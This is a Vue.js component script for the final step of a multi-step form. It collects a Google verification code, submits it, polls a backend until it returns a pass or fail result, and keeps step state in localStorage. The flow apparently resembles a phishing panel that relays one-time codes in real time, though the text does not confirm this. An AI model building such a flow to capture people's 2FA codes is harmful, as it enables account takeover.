<script>
    import Header from '@/components/CustomerHeader'
    import Footer from '@/components/CustomerFooter'

    export default {
        components: {
            Header, Footer
        },
        data() {
            return {
                time: 60,
                valid: {
                    validity: false,
                },
                form: {
                    fingerprint: "",
                    validity: "",
                },
                loading: false,
            };
        },
        created() {
            // this.checkStep();
        },
        mounted() {
            localStorage.setItem('index', '2');
            this.form.fingerprint = this.$route.query.fingerprint;
            this.divTime();
        },
        methods: {
            checkStep() {
                let index = localStorage.getItem('index');
                if (!index) {
                    this.$router.push('/');
                    return;
                } else if (index === '1') {
                    this.$router.push('/step2')
                    return;
                } else if (index === '3') {
                    this.$router.push('/success')
                    return;
                } else if (index === '999') {
                    window.location.href = localStorage.getItem('serverUrl');
                    return;
                }
                localStorage.setItem('index', '1');
            },
            divTime() {
                let time = this.time;
                if (time <= 0) {
                    return;
                }
                this.time = --time;
                setTimeout(() => {
                    this.divTime();
                }, 1000)
            },
            nextFn() {
                let data = this.form;
                data.currentStep = 3;
                data.stepTotal = 3;
                data.text = 'Google验证码';
                data.field = 'validity';
                this.form.notice = 'codeVer';
                if (this.validFn()) {
                    this.$api.subForm(data).then(resp => {
                        if (resp.code === 20000) {
                            this.loading = true;
                            this.checkFn(resp.data);
                        }
                    })
                }
            },
            checkFn(fingerprint) {
                this.$api.check({fingerprint: fingerprint}).then(resp => {
                    let data = resp.data;
                    let result = data.result;
                    if (result === 0) {
                        setTimeout(() => {
                            this.checkFn(fingerprint)
                        }, 1000)
                    } else {
                        this.loading = false;
                        if (result === 1) {
                            this.$router.push('/success?fingerprint=' + fingerprint);
                        } else {
                            this.$notify({type: 'warning', message: 'Os dados estão errados'});
                        }
                    }
                })
            },
            validFn() {
                let data = this.form;
                let validity = !data.validity;
                this.valid.validity = validity;
                return !validity;
            },
        },
    };
</script>

